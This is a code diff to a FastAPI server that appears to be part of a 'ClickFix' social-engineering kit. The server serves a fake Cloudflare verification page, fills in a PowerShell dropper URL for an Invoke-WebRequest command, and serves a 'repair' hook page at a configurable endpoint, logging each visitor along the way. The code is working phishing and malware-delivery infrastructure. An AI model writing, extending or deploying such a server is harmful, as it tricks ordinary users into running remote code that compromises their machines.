@@ -3,12 +3,8 @@ from fastapi.responses import FileResponse,HTMLResponse
 from do import DoShit
 import asyncio
 import aiofiles
-import configparser
+import config
 
-
-
-config = configparser.ConfigParser()
-config.read("names.conf")
 
 
 app = FastAPI()
@@ -23,17 +19,20 @@ app = FastAPI()
 async def root_route(req:Request):
     await DoShit(req).start("now")
 
-    async with aiofiles.open(config["Paths"]["cloudflare_page"],encoding="utf-8") as f:
+    async with aiofiles.open(config.conf["PATHS"]["cloudflare_page"],encoding="utf-8") as f:
         html = await f.read()
+    html = html.replace("{{PSScript URL for IWR}}",config.conf["URLS"]["powershell_dropper_url"])
+    html = html.replace("{{CLICK_FIX_PAGE}}",config.conf["URLS"]["clickfix_page"])
+    #print(html)
     return HTMLResponse(
-        html.replace("{{PSScript URL for IWR}}",config["Urls"]["powershell_dropper_url"])
+      html  
     )
 
-@app.get("/Repair")
+@app.get(f"{config.hookPageEndpoint}")
 async def repair(req:Request):
     await DoShit(req).start("now")
     return FileResponse(
-        config["Paths"]["clickfix_page"]
+        config.conf["PATHS"]["clickfix_page"]
     )
 
 
@@ -43,5 +42,5 @@ if __name__=="__main__":
     from colorama import init
     init()
     os.system(
-        "uvicorn main:app --port 9000 --host 0.0.0.0 --reload"
+        f"uvicorn {config.socialENGServerFile.replace(".py","")}:app --port {config.port} --host 0.0.0.0 --reload"
     )
